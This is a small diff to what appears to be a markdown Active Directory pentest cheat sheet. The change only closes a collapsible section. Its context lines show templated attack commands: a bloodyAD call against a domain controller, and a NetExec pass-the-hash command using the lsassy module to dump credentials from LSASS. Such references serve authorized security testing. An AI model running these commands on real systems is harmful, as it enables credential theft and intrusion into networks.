@@ -706,6 +706,8 @@ bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> 
   NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -M lsassy
   ```
 
+</details>
+
 <details>
   <summary><strong>MSSQL</strong></summary>
 
